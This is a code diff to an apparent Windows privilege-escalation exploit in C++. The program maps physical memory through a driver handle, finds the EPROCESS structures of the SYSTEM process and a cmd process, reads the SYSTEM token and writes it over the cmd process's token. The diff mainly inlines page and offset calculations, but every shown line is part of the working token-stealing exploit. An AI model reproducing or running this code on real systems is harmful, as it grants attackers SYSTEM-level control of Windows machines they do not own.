@@ -78,25 +78,17 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
-	size_t EPROCESS_SYSTEM_size = EPROCESS_SYSTEM.size();
-	std::vector <unsigned __int64> EPROCESS_SYSTEM_page;
-	std::vector <unsigned __int64> EPROCESS_SYSTEM_page_offset;
-	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
-		EPROCESS_SYSTEM_page.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)); // Sometimes crashes here FreeHeap()
-		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
-	}
-
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
-		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], 0x4000, buf) == FALSE) {
+	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
 
 		// print Token for each EPROCESS Base
 		PVOID castedBuf = *buf;
-		castedBuf = (unsigned char*)castedBuf + EPROCESS_SYSTEM_page_offset[i];
+		castedBuf = (unsigned char*)castedBuf + (EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		systemToken = *(unsigned __int64*)castedBuf;
@@ -115,24 +107,16 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
-	size_t EPROCESS_cmd_size = EPROCESS_cmd.size();
-	std::vector <unsigned __int64> EPROCESS_cmd_page;
-	std::vector <unsigned __int64> EPROCESS_cmd_page_offset;
-	for (size_t i = 0; i < EPROCESS_cmd_size; i++) {
-		EPROCESS_cmd_page.push_back(EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF));
-		EPROCESS_cmd_page_offset.push_back(EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
-	}
 
-
-	for (size_t i = 0; i < EPROCESS_cmd_size; i++) {
-		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
+	for (size_t i = 0; i < EPROCESS_cmd.size(); i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
 
 		// print Token for each EPROCESS Base
 		PVOID castedBuf = *buf;
-		castedBuf = (unsigned char*)castedBuf + EPROCESS_cmd_page_offset[i];
+		castedBuf = (unsigned char*)castedBuf + (EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
 		*(unsigned __int64*)castedBuf = systemToken; // this should do it
